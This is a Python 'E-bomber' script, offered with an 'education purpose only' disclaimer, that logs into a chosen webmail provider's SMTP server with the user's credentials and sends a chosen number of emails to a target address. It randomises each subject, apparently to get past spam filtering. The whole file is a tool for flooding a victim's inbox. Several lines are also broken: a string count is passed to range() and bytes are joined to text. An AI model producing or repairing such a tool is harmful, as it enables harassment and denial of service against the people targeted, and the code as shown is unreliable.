#!/usr/bin/python
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!

import os
import smtplib
import getpass
import sys

servnames = [ "Gmail", "Yahoo", "Outlook", "O2", "Orange", "1&1.com" , "Comcast", "Yandex" ]

tls = [ "smtp.yandex.ru", "smtp.gmail.com", "smtp.live.com"  , "smtp.1and1.com"]

print ("Please Choose Mail Server:")

num = 1
for el in servnames:
	print(str(num) + ". " + el)
	num = num + 1
n = input ("Enter number: ")

if n == "1":
    smtp_server = "smtp.gmail.com"
    port = 587
elif n == "2":
    smtp_server = "smtp.mail.yahoo.com"
    port = 25
elif n == "3":
    smtp_server = "smtp.live.com"
    port = 587
elif n == "4":
    smtp_server = "smtp.o2.ie"
    port = 25
elif n == "5":
    smtp_server = "smtp.orange.net"
    port = 25
elif n == "6":
    smtp_server = "smtp.1and1.com"
    port = 587
elif n == "7":
    smtp_server = "smtp.comcast.net"
    port = 587
elif n == "8":
    smtp_server = "smtp.yandex.ru"
    port = 587
else:
    print("Invalid input.")
    sys.exit()

user = input("Email: ")
passwd = getpass.getpass("Password: ")

to = input("\nTo: ")
body = input("Message: ")
total = input("Number of send: ")

print('')

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server in tls:
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = "From: " + user + "\nSubject: " + subject + "\n" + body
        server.sendmail(user,to,msg)
        print("E-mails sent: " + i)
        sys.stdout.flush()
    server.quit()
    print("Done !!!")
except KeyboardInterrupt:
    print("[-] Canceled")
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print("[!] The username or password you entered is incorrect.Make sure secure login is OFF.")
    sys.exit()
